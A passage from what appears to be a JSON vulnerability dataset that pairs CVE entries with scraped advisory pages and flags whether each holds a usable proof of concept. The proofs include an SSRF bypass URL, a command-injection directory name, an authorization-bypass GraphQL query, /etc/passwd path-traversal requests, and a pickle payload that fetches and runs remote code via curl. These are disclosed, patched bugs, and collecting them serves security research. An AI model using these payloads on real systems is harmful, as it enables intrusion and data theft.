        url = self.extra_url_validator(url)\n\n        response = req.request(\n            method,\n            url,\n            headers=headers,\n            allow_redirects=allow_redirects,\n            *args,\n            **kwargs,\n        )\n        if self.raise_for_status:\n            response.raise_for_status()\n\n        return response\n\n    def get(self, url, *args, **kwargs) -> req.Response:\n        return self.request(\"GET\", url, *args, **kwargs)\n\n    def post(self, url, *args, **kwargs) -> req.Response:\n        return self.request(\"POST\", url, *args, **kwargs)\n\n    def put(self, url, *args, **kwargs) -> req.Response:\n        return self.request(\"PUT\", url, *args, **kwargs)\n\n    def delete(self, url, *args, **kwargs) -> req.Response:\n        return self.request(\"DELETE\", url, *args, **kwargs)\n\n    def head(self, url, *args, **kwargs) -> req.Response:\n        return self.request(\"HEAD\", url, *args, **kwargs)\n\n    def options(self, url, *args, **kwargs) -> req.Response:\n        return self.request(\"OPTIONS\", url, *args, **kwargs)\n\n    def patch(self, url, *args, **kwargs) -> req.Response:\n        return self.request(\"PATCH\", url, *args, **kwargs)\n\n\nrequests = Requests(trusted_origins=[])\nresponse = requests.get(\"http://localhost:\\\\@google.com/../\")\nprint(response)\nImpact\nA malicious attacker is able to bypass the check performed on the provided URL and perform a SSRF attack.\nOccurrences\nrequest.py L42-L63\nWe are processing your report and will contact thesignificant-gravitas/autogpt team within 24 hours.5 months ago\nhuntr-helper\ncommented5 months ago\nAdmin\nThis report was determined to possibly be out of scope or have a high likelyhood of being marked as informative.\nPlease review your report and the Participation Guidelines.\nThese are the specific guidelines this report is in possible violation of:\nBlind or otherwise limited server-side request forgeries (ssrf)\nEdoardo Geraci\ncommented5 months ago\nResearcher\nThe SSRF is not blind, given that it is a complete bypass of the SSRF check, applied to requests that do return the response content to the user when performed\nA significant-gravitas/autogpt maintainerhas acknowledged this report5 months ago\nThe scheduled publication date was automatically extended from 4th Mar 2025  to 11th Mar 2025  due to the maintainers acknowledgement of the report5 months ago\nZamil Majdy\ncommented5 months ago\nMaintainer\nThank you for the report! I'm adding another layer of validation & filtering here: https://github.com/Significant-Gravitas/AutoGPT/pull/8890\nLet me know if this is enough.\nEdoardo Geraci\ncommented5 months ago\nResearcher\nit looks good to me, the parsing differential stops if the \\ is not present anymore\nNicholas Tindle gave praise5 months ago\nThe researcher's credibility has slightly increased as a result of the maintainer's thanks: +1\nEdoardo Geraci\ncommented5 months ago\nResearcher\nany news on CVE assignment for this bug?\nThis report has now been passed to internal triage and should be resolved within 14 days.4 months ago\nEthan Silvasmodified the Severity from High (8.6) to High (7.5)4 months ago\nThe researcher has received a minor penalty to their credibility for miscalculating the severity: -1\nEthan Silvas validated this vulnerability4 months ago\nb0-n0-b0has been awarded the disclosure bounty\nThe fix bounty is now up for grabs\nThe researcher's credibility has increased: +7\nCVE-2025-0454assigned to this report.4 months ago\nEthan Silvasmarked this as fixedin v0.4.0with commitff065c4 months ago\nNicholas Tindlehas been awarded the fix bounty\nrequest.py#L42-L63 has been validated\nWe have notified the significant-gravitas/autogpt maintainers about this report in their weekly follow-up3 months ago\nWe have sent a warning to the significant-gravitas/autogpt team to inform them that this report will be published in 48 hours2 months ago\nThis vulnerability has now been published2 months ago\nCVE-2025-0454has now been published2 months ago\nSign in to join this conversation\nCVE\nCVE-2025-0454\n(Published)\nVulnerability Type\nCWE-918: Server-Side Request Forgery (SSRF)\nSeverity\nHigh (7.5)\nAttack vector\nNetwork\nAttack complexity\nLow\nPrivileges required\nNone\nUser interaction\nNone\nScope\nUnchanged\nConfidentiality\nHigh\nIntegrity\nNone\nAvailability\nNone\nOpen in visual CVSS calculator\nRegistry\nOther\nAffected Version\n0.3.4\nVisibility\nPublic\nStatus\nFixed\nFound by\nFixed by\nSupported by Protect AI and leading the way to MLSecOps and greater AI security.\n\u00a9 2024\nPrivacy Policy\nTerms of Service\nCode of Conduct\nCookie Preferences\nContact Us",
                "effective": true,
                "effective_reason": "The security advisory contains a proof of concept demonstrating how to exploit the vulnerability, including example code and steps."
            }
        ],
        "cwe": [
            {
                "id": "CWE-918",
                "value": "CWE-918 Server-Side Request Forgery (SSRF)"
            }
        ]
    },
    "CVE-2025-30370": {
        "published_date": "2025-04-03T22:00:44.476Z",
        "patch_commits": [],
        "sw_version": "v0.51.0",
        "sw_version_wget": "https://github.com/jupyterlab/jupyterlab-git/archive/refs/tags/v0.51.0.zip",
        "description": "jupyterlab-git is a JupyterLab extension for version control using Git. On many platforms, a third party can create a Git repository under a name that includes a shell command substitution string in the syntax $(<command>). These directory names are allowed in macOS and a majority of Linux distributions. If a user starts jupyter-lab in a parent directory of this inappropriately-named Git repository, opens it, and clicks \"Git > Open Git Repository in Terminal\" from the menu bar, then the injected command <command> is run in the user's shell without the user's permission. This issue is occurring because when that menu entry is clicked, jupyterlab-git opens the terminal and runs cd <git-repo-path> through the shell to set the current directory. Doing so runs any command substitution strings present in the directory name, which leads to the command injection issue described here. A previous patch provided an incomplete fix. This vulnerability is fixed in 0.51.1.",
        "sec_adv": [
            {
                "url": "https://github.com/jupyterlab/jupyterlab-git/security/advisories/GHSA-cj5w-8mjf-r5f8",
                "content": "Skip to content\nNavigation Menu\nProduct\nSolutions\nResources\nOpen Source\nEnterprise\nPricing\nSearch or jump to...\nSign in\nSign up\nAppearance settings\nDismiss alert\njupyterlab\n/\njupyterlab-git\nPublic\nNotifications You must be signed in to change notification settings\nFork 348\nStar 1.5k\nCode\nIssues\n105\nPull requests\n10\nDiscussions\nActions\nProjects\nSecurity\n1\nInsights\nAdditional navigation options\nCommand injection vulnerability in \"Open Git Repository in Terminal\"\nHigh dlqqq published GHSA-cj5w-8mjf-r5f8 on Apr 3Apr 3, 2025\nPackage\npip jupyterlab-git\n(\npip\n)\nAffected versions\n<=0.51.0\nPatched versions\n>=0.51.1\nDescription\nOverview\nOn many platforms, a third party can create a Git repository under a name that includes a shell command substitution 1 string in the syntax $(<command>). These directory names are allowed in macOS and a majority of Linux distributions 2. If a user starts jupyter-lab in a parent directory of this inappropriately-named Git repository, opens it, and clicks \"Git > Open Git Repository in Terminal\" from the menu bar, then the injected command <command> is run in the user's shell without the user's permission.\nThis issue is occurring because when that menu entry is clicked, jupyterlab-git opens the terminal and runs cd <git-repo-path> through the shell to set the current directory 3. Doing so runs any command substitution strings present in the directory name, which leads to the command injection issue described here. A previous patch provided an incomplete fix 4.\nScope of Impact\nThis issue allows for arbitrary code execution via command injection. A wide range of actions are permitted by this issue, including but not limited to: modifying files, exfiltrating data, halting services, or compromising the server's security rules.\nWe have scanned the source code of jupyterlab-git for other command injection risks, and have not found any at the time of writing.\nThis issue was reproduced on the latest release of jupyterlab-git, v0.51.0. The steps taken to reproduce this issue are described in the \"Proof-of-concept\" section below.\nProof-of-concept\nCreate a new directory via mkdir test/ && cd test/.\nCreate a new Git repository under test/ with a command substitution string in the directory name by running these commands:\nmkdir '$(touch pwned.txt)'\ncd '$(touch pwned.txt)/'\ngit init\ncd ..\nStart JupyterLab from test/ by running jupyter lab.\nWith JupyterLab open in the browser, double click on $(touch pwned.txt) in the file browser.\nFrom the top menu bar, click \"Git > Open Git Repository in Terminal\".\nVerify that pwned.txt is created under test/. This demonstrates the command injection issue described here.\nProof-of-concept mitigation\nThe issue can be mitigated by the patch shown below.\nPatch (click to expand)\nThis patch removes the cd <git-repo-path> shell command that causes the issue. To preserve the existing behavior, the cwd argument is set to <git-repo-path> when a terminal session is created via the terminal:create-new JupyterLab command. This preserves the existing application behavior while mitigating the command injection issue.\nWe have verified that this patch works when applied to a local installation of jupyterlab-git. We have also verified that the cwd argument is available in all versions of JupyterLab 4, so this patch should be fully backwards-compatible.\nWorkarounds\nWe recommend that users upgrade to the patched versions listed on this GHSA. However, if a user is unable to upgrade, there are 3 different ways to mitigate this vulnerability without upgrading to a patch.\nDisable terminals on jupyter-server level:\nc.ServerApp.terminals_enabled =  False\nDisable the terminals server extension:\njupyter server extension disable jupyter_server_terminals\nDisable the lab extension:\njupyter labextension disable @jupyterlab/terminal-extension\nFootnotes\nhttps://www.gnu.org/software/bash/manual/html_node/Command-Substitution.html \u21a9\nhttps://www.gnu.org/software/libc/manual/html_node/File-Name-Portability.html \u21a9\nhttps://github.com/jupyterlab/jupyterlab-git/blob/7eb3b06f0092223bd5494688ec264527bbeb2195/src/commandsAndMenu.tsx#L175-L184 \u21a9\nhttps://github.com/jupyterlab/jupyterlab-git/pull/1196 \u21a9\nSeverity\nHigh\n7.4\n/ 10\nCVSS v3 base metrics\nAttack vector\nLocal\nAttack complexity\nHigh\nPrivileges required\nLow\nUser interaction\nRequired\nScope\nChanged\nConfidentiality\nLow\nIntegrity\nHigh\nAvailability\nHigh\nLearn more about base metrics\nCVSS:3.1/AV:L/AC:H/PR:L/UI:R/S:C/C:L/I:H/A:H\nCVE ID\nCVE-2025-30370\nWeaknesses\nCWE-78\nCredits\ndlqqq\nAnalyst\nrpwagner\nCoordinator\nkrassowski\nAnalyst\nFooter\n\u00a9 2025 GitHub, Inc.\nFooter navigation\nTerms\nPrivacy\nSecurity\nStatus\nDocs\nContact\nManage cookies\nDo not share my personal information",
                "effective": true,
                "effective_reason": "The advisory includes a detailed proof of concept with steps to reproduce the vulnerability."
            }
        ],
        "cwe": [
            {
                "id": "CWE-78",
                "value": "CWE-78: Improper Neutralization of Special Elements used in an OS Command ('OS Command Injection')"
            }
        ]
    },
    "CVE-2025-31481": {
        "cwe": [
            {
                "id": "CWE-863",
                "value": "CWE-863: Incorrect Authorization"
            }
        ],
        "description": "API Platform Core is a system to create hypermedia-driven REST and GraphQL APIs. Using the Relay special node type you can bypass the configured security on an operation. This vulnerability is fixed in 4.0.22 and 3.4.17.",
        "languages": [
            "PHP"
        ],
        "patch_commits": [],
        "published_date": "2025-04-03T19:20:22.916Z",
        "sec_adv": [
            {
                "content": "Skip to content\nNavigation Menu\nProduct\nSolutions\nResources\nOpen Source\nEnterprise\nPricing\nSearch or jump to...\nSign in\nSign up\nAppearance settings\nDismiss alert\napi-platform\n/\ncore\nPublic\nSponsor\nNotifications You must be signed in to change notification settings\nFork 906\nStar 2.5k\nCode\nIssues\n170\nPull requests\n48\nDiscussions\nActions\nProjects\nWiki\nSecurity\n5\nInsights\nAdditional navigation options\nGraphQL query operations security can be bypassed\nHigh soyuka published GHSA-cg3c-245w-728m on Apr 3Apr 3, 2025\nPackage\ncomposer api-platform/core\n(\nComposer\n)\nAffected versions\n<4.0.21\n<3.4.16\nPatched versions\n4.0.22\n3.4.17\ncomposer api-platform/graphql\n(\nComposer\n)\n<4.0.21\n<3.4.16\n4.0.22\n3.4.17\nDescription\nSummary\nUsing the Relay special node type you can bypass the configured security on an operation.\nDetails\nHere is an example of how to apply security configurations for the GraphQL operations:\n#[ApiResource(\n    security: \"is_granted('ROLE_USER')\",\n    operations: [ /* ... */ ],\n    graphQlOperations: [\n        new Query(security: \"is_granted('ROLE_USER')\"),\n        //...\n    ],\n)]\nclass Book { /* ... */ }\nThis indeed checks is_granted('ROLE_USER') as expected for a GraphQL query like the following:\n\u200cquery {\n    book(id: \"/books/1\") {\n        title\n    }\n}\nBut the security check can be bypassed by using the node field (that is available by default) on the root query type like that:\n\u200cquery {\n    node(id: \"/books/1\") {\n        ... on Book {\n            title\n        }\n    }\n}\nThis does not execute any security checks and can therefore be used to access any entity without restrictions by everyone that has access to the API.\nImpact\nEveryone using GraphQl with the security attribute. Not sure whereas this works with custom resolvers nor if this also applies on mutation.\nPatched at 60747cc\nSeverity\nHigh\n7.5\n/ 10\nCVSS v3 base metrics\nAttack vector\nNetwork\nAttack complexity\nLow\nPrivileges required\nNone\nUser interaction\nNone\nScope\nUnchanged\nConfidentiality\nHigh\nIntegrity\nNone\nAvailability\nNone\nLearn more about base metrics\nCVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N\nCVE ID\nCVE-2025-31481\nWeaknesses\nNo CWEs\nCredits\nsoyuka\nRemediation developer\nausi\nReporter\nalanpoulain\nRemediation reviewer\nFooter\n\u00a9 2025 GitHub, Inc.\nFooter navigation\nTerms\nPrivacy\nSecurity\nStatus\nDocs\nContact\nManage cookies\nDo not share my personal information",
                "effective": true,
                "effective_reason": "The advisory includes specific example GraphQL queries demonstrating the vulnerability.",
                "url": "https://github.com/api-platform/core/security/advisories/GHSA-cg3c-245w-728m"
            }
        ],
        "sw_version": "v4.0.0",
        "sw_version_wget": "https://github.com/api-platform/core/archive/refs/tags/v4.0.0.zip"
    },
    "CVE-2025-27092": {
        "published_date": "2025-02-19T22:16:56.207Z",
        "patch_commits": [],
        "sw_version": "v8.0.0",
        "sw_version_wget": "https://github.com/cmu-sei/GHOSTS/archive/refs/tags/v8.0.0.zip",
        "description": "GHOSTS is an open source user simulation framework for cyber experimentation, simulation, training, and exercise. A path traversal vulnerability was discovered in GHOSTS version 8.0.0.0 that allows an attacker to access files outside of the intended directory through the photo retrieval endpoint. The vulnerability exists in the /api/npcs/{id}/photo endpoint, which is designed to serve profile photos for NPCs (Non-Player Characters) but fails to properly validate and sanitize file paths. When an NPC is created with a specially crafted photoLink value containing path traversal sequences (../, ..\\, etc.), the application processes these sequences without proper sanitization. This allows an attacker to traverse directory structures and access files outside of the intended photo directory, potentially exposing sensitive system files. The vulnerability is particularly severe because it allows reading arbitrary files from the server's filesystem with the permissions of the web application process, which could include configuration files, credentials, or other sensitive data. This issue has been addressed in version 8.2.7.90 and all users are advised to upgrade. There are no known workarounds for this vulnerability.",
        "sec_adv": [
            {
                "url": "https://github.com/cmu-sei/GHOSTS/security/advisories/GHSA-qr67-m6w9-wj3j",
                "content": "Skip to content\nNavigation Menu\nProduct\nSolutions\nResources\nOpen Source\nEnterprise\nPricing\nSearch or jump to...\nSign in\nSign up\nAppearance settings\nDismiss alert\ncmu-sei\n/\nGHOSTS\nPublic\nNotifications You must be signed in to change notification settings\nFork 75\nStar 565\nCode\nIssues\n13\nPull requests\nDiscussions\nActions\nSecurity\n1\nInsights\nAdditional navigation options\n[XBOW-025-109] Path Traversal Vulnerability in GHOSTS API 8.x Photo Retrieval Endpoint\nCritical sei-dupdyke published GHSA-qr67-m6w9-wj3j on Feb 19Feb 19, 2025\nPackage\nGHOSTS API\nAffected versions\nGHOSTS API v 8.0.0 through 8.2.7.90\nPatched versions\n8.2.7.90\nDescription\nDisclaimer\nThis vulnerability was detected using XBOW, a system that autonomously finds and exploits potential security vulnerabilities. The finding has been thoroughly reviewed and validated by a security researcher before submission. While XBOW is intended to work autonomously, during its development human experts ensure the accuracy and relevance of its reports.\nDescription\nA path traversal vulnerability was discovered in GHOSTS version 8.0.0.0 that allows an attacker to access files outside of the intended directory through the photo retrieval endpoint. The vulnerability exists in the /api/npcs/{id}/photo endpoint, which is designed to serve profile photos for NPCs (Non-Player Characters) but fails to properly validate and sanitize file paths.\nWhen an NPC is created with a specially crafted photoLink value containing path traversal sequences (../, .., etc.), the application processes these sequences without proper sanitization. This allows an attacker to traverse directory structures and access files outside of the intended photo directory, potentially exposing sensitive system files.\nThe vulnerability is particularly severe because it allows reading arbitrary files from the server's filesystem with the permissions of the web application process, which could include configuration files, credentials, or other sensitive data.\nSteps to Reproduce\nCreate a new NPC by sending a POST request to /api/npcs with a valid GUID and including path traversal in the photoLink:\nPOST /api/npcs HTTP/1.1\nHost: ghosts:5000\nContent-Type: application/json\n\n{\n  \"id\": \"<valid-guid>\",\n  \"name\": {\"firstName\": \"test\", \"lastName\": \"test\"},\n  \"photoLink\": \"..//../..//../..//etc/passwd\"\n}\nAccess the photo endpoint for the created NPC:\nGET /api/npcs/<npc-id>/photo HTTP/1.1\nHost: ghosts:5000\nAfter following these steps, the server responds with the contents of the target file instead of a legitimate photo, demonstrating successful path traversal. The application returns the file content with a Content-Type of image/jpg, regardless of the actual file type.\nMitigations available in GHOSTS API v8.2.7.90 and later\nPath validation and sanitization that removes or blocks path traversal sequences (../, .., etc.) before processing file paths.\nMust call a valid image directory and must be a valid image extension (jpeg, jpg, png).\nImpact\nThis vulnerability allows authenticated users to read arbitrary files from the server's filesystem that are accessible to the application's service account. The impact is high as it could lead to exposure of sensitive information such as configuration files, credentials, or other confidential data stored on the server.\nSeverity\nCritical\nCVE ID\nCVE-2025-27092\nWeaknesses\nNo CWEs\nCredits\nxbow-security\nReporter\nFooter\n\u00a9 2025 GitHub, Inc.\nFooter navigation\nTerms\nPrivacy\nSecurity\nStatus\nDocs\nContact\nManage cookies\nDo not share my personal information",
                "effective": true,
                "effective_reason": "The advisory contains specific steps to reproduce the vulnerability, demonstrating how to exploit the issue."
            }
        ],
        "cwe": [
            {
                "id": "CWE-22",
                "value": "CWE-22: Improper Limitation of a Pathname to a Restricted Directory ('Path Traversal')"
            }
        ]
    },
    "CVE-2025-1944": {
        "published_date": "2025-03-10T11:30:32.896Z",
        "patch_commits": [],
        "sw_version": "v0.0.22",
        "sw_version_wget": "https://github.com/mmaitre314/picklescan/archive/refs/tags/v0.0.22.zip",
        "description": "picklescan before 0.0.23 is vulnerable to a ZIP archive manipulation attack that causes it to crash when attempting to extract and scan PyTorch model archives. By modifying the filename in the ZIP header while keeping the original filename in the directory listing, an attacker can make PickleScan raise a BadZipFile error. However, PyTorch's more forgiving ZIP implementation still allows the model to be loaded, enabling malicious payloads to bypass detection.",
        "sec_adv": [
            {
                "url": "https://github.com/mmaitre314/picklescan/security/advisories/GHSA-7q5r-7gvp-wc82",
                "content": "Skip to content\nNavigation Menu\nProduct\nSolutions\nResources\nOpen Source\nEnterprise\nPricing\nSearch or jump to...\nSign in\nSign up\nAppearance settings\nDismiss alert\nmmaitre314\n/\npicklescan\nPublic\nNotifications You must be signed in to change notification settings\nFork 35\nStar 336\nCode\nIssues\n1\nPull requests\nActions\nProjects\nSecurity\n7\nInsights\nAdditional navigation options\nZip Exploit Crashes Picklescan But Not PyTorch\nModerate mmaitre314 published GHSA-7q5r-7gvp-wc82 on Mar 8Mar 9, 2025\nPackage\npip picklescan\n(\npip\n)\nAffected versions\n< 0.0.23\nPatched versions\n0.0.23\nDescription\nCVE-2025-1944\nSummary\nPickleScan is vulnerable to a ZIP archive manipulation attack that causes it to crash when attempting to extract and scan PyTorch model archives. By modifying the filename in the ZIP header while keeping the original filename in the directory listing, an attacker can make PickleScan raise a BadZipFile error. However, PyTorch's more forgiving ZIP implementation still allows the model to be loaded, enabling malicious payloads to bypass detection.\nDetails\nPython's built-in zipfile module performs strict integrity checks when extracting ZIP files. If a filename stored in the ZIP header does not match the filename in the directory listing, zipfile.ZipFile.open() raises a BadZipFile error. PickleScan relies on zipfile to extract and inspect the contents of PyTorch model archives, making it susceptible to this manipulation.\nPyTorch, on the other hand, has a more tolerant ZIP handling mechanism that ignores these discrepancies, allowing the model to load even when PickleScan fails. An attacker can exploit this behavior to embed a malicious pickle file inside a model archive, which PyTorch will load, while preventing PickleScan from scanning the archive.\nPoC\nimport os\nimport torch\n\nclass RemoteCodeExecution:\n    def __reduce__(self):\n        return os.system, (f\"eval \\\"$(curl -s http://localhost:8080)\\\"\",)\n\n\nmodel = RemoteCodeExecution()\nfile = \"does_not_scan_but_opens_in_torch.pth\"\ntorch.save(model, file)\n\n# modify the header to cause the zip file to raise execution in picklescan\nwith open(file, \"rb\") as f:\n    data = f.read()\n\n# Replace only the first occurrence of \"data.pkl\" with \"datap.kl\"\nmodified_data = data.replace(b\"data.pkl\", b\"datap.kl\", 1)\n\n# Write back the modified content\nwith open(file, \"wb\") as f:\n    f.write(modified_data)\n\n# Load the infected model\ntorch.load(file)  \nImpact\nSeverity: High\nWho is impacted? Any organization or individual using PickleScan to detect malicious pickle files in PyTorch models.\nWhat is the impact? Attackers can embed malicious payloads inside PyTorch model archives while preventing PickleScan from scanning them.\nPotential Exploits: This technique can be used in supply chain attacks to distribute backdoored models via platforms like Hugging Face.\nRecommendations\nUse a More Tolerant ZIP Parser: PickleScan should handle minor ZIP header inconsistencies more gracefully instead of failing outright.\nDetect Malformed ZIPs: Instead of crashing, PickleScan should log warnings and attempt to extract valid files.\nSeverity\nModerate\n5.3\n/ 10\nCVSS v4 base metrics\nExploitability Metrics\nAttack Vector\nNetwork\nAttack Complexity\nLow\nAttack Requirements\nNone\nPrivileges Required\nNone\nUser interaction\nPassive\nVulnerable System Impact Metrics\nConfidentiality\nNone\nIntegrity\nLow\nAvailability\nNone\nSubsequent System Impact Metrics\nConfidentiality\nNone\nIntegrity\nNone\nAvailability\nNone\nLearn more about base metrics\nCVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:P/VC:N/VI:L/VA:N/SC:N/SI:N/SA:N\nCVE ID\nNo known CVE\nWeaknesses\nNo CWEs\nCredits\nmadgetr\nReporter\naxsonatype\nCoordinator\nFooter\n\u00a9 2025 GitHub, Inc.\nFooter navigation\nTerms\nPrivacy\nSecurity\nStatus\nDocs\nContact\nManage cookies\nDo not share my personal information",
                "effective": true,
                "effective_reason": "The advisory includes a code snippet demonstrating how to modify the ZIP file to exploit the vulnerability in the library."
            }
        ],
        "cwe": [
            {
                "id": "CWE-345",
                "value": "CWE-345 Insufficient Verification of Data Authenticity"
            }
        ]
    },
    "CVE-2025-25288": {
        "published_date": "2025-02-14T19:33:43.428Z",
        "patch_commits": [],
        "sw_version": "v1.0.0",
        "sw_version_wget": "https://github.com/octokit/plugin-paginate-rest.js/archive/refs/tags/v1.0.0.zip",
        "description": "@octokit/plugin-paginate-rest is the Octokit plugin to paginate REST API endpoint responses. For versions starting in 1.0.0 and prior to 11.4.1 of the npm package `@octokit/plugin-paginate-rest`, when calling `octokit.paginate.iterator()`, a specially crafted `octokit` instance\u2014particularly with a malicious `link` parameter in the `headers` section of the `request`\u2014can trigger a ReDoS attack. Version 11.4.1 contains a fix for the issue.",
        "sec_adv": [
            {
                "url": "https://github.com/octokit/plugin-paginate-rest.js/security/advisories/GHSA-h5c3-5r3r-rr8q",
                "content": "Skip to content\nNavigation Menu\nProduct\nSolutions\nResources\nOpen Source\nEnterprise\nPricing\nSearch or jump to...\nSign in\nSign up\nAppearance settings\nDismiss alert\noctokit\n/\nplugin-paginate-rest.js\nPublic\nNotifications You must be signed in to change notification settings\nFork 27\nStar 51\nCode\nIssues\n5\nPull requests\n2\nActions\nSecurity\n1\nInsights\nAdditional navigation options\nRegular Expression in iterator Leads to ReDoS Vulnerability Due to Catastrophic Backtracking\nModerate nickfloyd published GHSA-h5c3-5r3r-rr8q on Feb 14Feb 14, 2025\nPackage\nnpm @octokit/plugin-paginate-rest\n(\nnpm\n)\nAffected versions\n>=v1.0.0\nPatched versions\n>=v11.4.1\nDescription\nSummary\nFor the npm package @octokit/plugin-paginate-rest, when calling octokit.paginate.iterator(), a specially crafted octokit instance\u2014particularly with a malicious link parameter in the headers section of the request\u2014can trigger a ReDoS attack.\nDetails\nThe issue occurs at line 39 of iterator.ts in the @octokit/plugin-paginate-rest repository. The relevant code is as follows:\nurl = ((normalizedResponse.headers.link || \"\").match(\n  /<([^>]+)>;\\s*rel=\"next\"/,\n) || [])[1];\nThe regular expression /<([^>]+)>;\\s*rel=\"next\"/ may lead to a potential backtracking vulnerability, resulting in a ReDoS (Regular Expression Denial of Service) attack. This could cause high CPU utilization and even service slowdowns or freezes when processing specially crafted Link headers.\nPoC\nThe gist of PoC.js\nrun npm i @octokit/plugin-paginate-rest\nrun 'node poc.js'\nresult:\nthen the program will stuck forever with high CPU usage\nimport { Octokit } from \"@octokit/core\";\nimport { paginateRest } from \"@octokit/plugin-paginate-rest\";\n\nconst MyOctokit = Octokit.plugin(paginateRest);\nconst octokit = new MyOctokit({\n  auth: \"your-github-token\",\n});\n\n// Intercept the request to inject a malicious 'link' header for ReDoS\noctokit.hook.wrap(\"request\", async (request, options) => {\n  const maliciousLinkHeader = \"\" + \"<\".repeat(100000) + \">\"; // attack string\n  return {\n    data: [],\n    headers: {\n      link: maliciousLinkHeader, // Inject malicious 'link' header\n    },\n  };\n});\n\n// Trigger the ReDoS attack by paginating through GitHub issues\n(async () => {\n  try {\n    for await (const normalizedResponse of octokit.paginate.iterator(\n      \"GET /repos/{owner}/{repo}/issues\", { owner: \"DayShift\", repo: \"ReDos\", per_page: 100 }\n    )) {\n      console.log({ normalizedResponse });\n    }\n  } catch (error) {\n    console.error(\"Error encountered:\", error);\n  }\n})();\nImpact\nWhat kind of vulnerability is it?\nThis is a Regular Expression Denial of Service (ReDoS) vulnerability, which occurs due to excessive backtracking in the regex pattern:\n/<([^>]+)>;\\s*rel=\"next\"/\nWhen processing a specially crafted Link header, this regex can cause significant performance degradation, leading to high CPU utilization and potential service unresponsiveness.\nWho is impacted?\nUsers of @octokit/plugin-paginate-rest who call octokit.paginate.iterator() and process untrusted or manipulated Link headers.\nApplications relying on Octokit's pagination mechanism, particularly those handling large volumes of API requests.\nGitHub API consumers who integrate this package into their projects for paginated data retrieval.\nSeverity\nModerate\n5.3\n/ 10\nCVSS v3 base metrics\nAttack vector\nNetwork\nAttack complexity\nLow\nPrivileges required\nNone\nUser interaction\nNone\nScope\nUnchanged\nConfidentiality\nNone\nIntegrity\nNone\nAvailability\nLow\nLearn more about base metrics\nCVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:L\nCVE ID\nCVE-2025-25288\nWeaknesses\nCWE-1333\nCredits\nShiyuBanzhou\nReporter\nFooter\n\u00a9 2025 GitHub, Inc.\nFooter navigation\nTerms\nPrivacy\nSecurity\nStatus\nDocs\nContact\nManage cookies\nDo not share my personal information",
                "effective": true,
                "effective_reason": "The advisory contains a 'Proof of Concept' code segment demonstrating how to exploit the Regular Expression Denial of Service (ReDoS) vulnerability in the specified library."
            }
        ],
        "cwe": [
            {
                "id": "CWE-1333",
                "value": "CWE-1333: Inefficient Regular Expression Complexity"
            }
        ]
    },
    "CVE-2025-24963": {
        "published_date": "2025-02-04T19:36:52.385Z",
        "patch_commits": [],
        "sw_version": "v2.0.4",
        "sw_version_wget": "https://github.com/vitest-dev/vitest/archive/refs/tags/v2.0.4.zip",
        "description": "Vitest is a testing framework powered by Vite. The `__screenshot-error` handler on the browser mode HTTP server that responds any file on the file system. Especially if the server is exposed on the network by `browser.api.host: true`, an attacker can send a request to that handler from remote to get the content of arbitrary files.This `__screenshot-error` handler on the browser mode HTTP server responds any file on the file system. This code was added by commit `2d62051`. Users explicitly exposing the browser mode server to the network by `browser.api.host: true` may get any files exposed. This issue has been addressed in versions 2.1.9 and 3.0.4. Users are advised to upgrade. There are no known workarounds for this vulnerability.",
        "sec_adv": [
            {
                "url": "https://github.com/vitest-dev/vitest/security/advisories/GHSA-8gvc-j273-4wm5",
                "content": "Skip to content\nNavigation Menu\nProduct\nSolutions\nResources\nOpen Source\nEnterprise\nPricing\nSearch or jump to...\nSign in\nSign up\nAppearance settings\nDismiss alert\nvitest-dev\n/\nvitest\nPublic\nSponsor\nNotifications You must be signed in to change notification settings\nFork 1.3k\nStar 14.3k\nCode\nIssues\n278\nPull requests\n83\nDiscussions\nActions\nProjects\n1\nSecurity\n2\nInsights\nAdditional navigation options\nBrowser mode serves arbitrary files\nModerate sheremet-va published GHSA-8gvc-j273-4wm5 on Feb 3Feb 4, 2025\nPackage\nnpm vitest\n(\nnpm\n)\nAffected versions\n>=2.0.4, <=2.1.8\n>=3.0.0, <= 3.0.3\nPatched versions\n>=2.1.9, <3.0.0\n>=3.0.4\nDescription\nSummary\n__screenshot-error handler on the browser mode HTTP server that responds any file on the file system. Especially if the server is exposed on the network by browser.api.host: true, an attacker can send a request to that handler from remote to get the content of arbitrary files.\nDetails\nThis __screenshot-error handler on the browser mode HTTP server responds any file on the file system.\nvitest/packages/browser/src/node/plugin.ts\nLines 88 to 130 in f17918a\n   server.middlewares.use(`${base}__screenshot-error`, function vitestBrowserScreenshotError(req, res) { \n     if (!req.url) { \n       res.statusCode = 404 \n       res.end() \n       return \n     } \n        const url = new URL(req.url, 'http://localhost') \n     const file = url.searchParams.get('file') \n     if (!file) { \n       res.statusCode = 404 \n       res.end() \n       return \n     } \n        let stat: Stats | undefined \n     try { \n       stat = lstatSync(file) \n     } \n     catch { \n     } \n        if (!stat?.isFile()) { \n       res.statusCode = 404 \n       res.end() \n       return \n     } \n        const ext = extname(file) \n     const buffer = readFileSync(file) \n     res.setHeader( \n       'Cache-Control', \n       'public,max-age=0,must-revalidate', \n     ) \n     res.setHeader('Content-Length', buffer.length) \n     res.setHeader('Content-Type', ext === 'jpeg' || ext === 'jpg' \n       ? 'image/jpeg' \n       : ext === 'webp' \n         ? 'image/webp' \n         : 'image/png') \n     res.end(buffer) \n   }) \n } \nThis code was added by 2d62051.\nPoC\nCreate a directory and change the current directory to that directory\nRun npx vitest init browser\nRun npm run test:browser\nRun curl http://localhost:63315/__screenshot-error?file=/path/to/any/file\nImpact\nUsers explicitly exposing the browser mode server to the network by browser.api.host: true may get any files exposed.\nSeverity\nModerate\n5.9\n/ 10\nCVSS v3 base metrics\nAttack vector\nNetwork\nAttack complexity\nHigh\nPrivileges required\nNone\nUser interaction\nNone\nScope\nUnchanged\nConfidentiality\nHigh\nIntegrity\nNone\nAvailability\nNone\nLearn more about base metrics\nCVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:H/I:N/A:N\nCVE ID\nCVE-2025-24963\nWeaknesses\nCWE-22\nCredits\nsapphi-red\nReporter\nFooter\n\u00a9 2025 GitHub, Inc.\nFooter navigation\nTerms\nPrivacy\nSecurity\nStatus\nDocs\nContact\nManage cookies\nDo not share my personal information",
                "effective": true,
                "effective_reason": "The advisory contains a section labeled 'PoC' which includes steps to recreate the vulnerability."
            }
        ],
        "cwe": [
            {
                "id": "CWE-22",
                "value": "CWE-22: Improper Limitation of a Pathname to a Restricted Directory ('Path Traversal')"
            }
        ]
    },
    "CVE-2025-32014": {
        "published_date": "2025-04-07T14:56:40.413Z",
        "patch_commits": [],
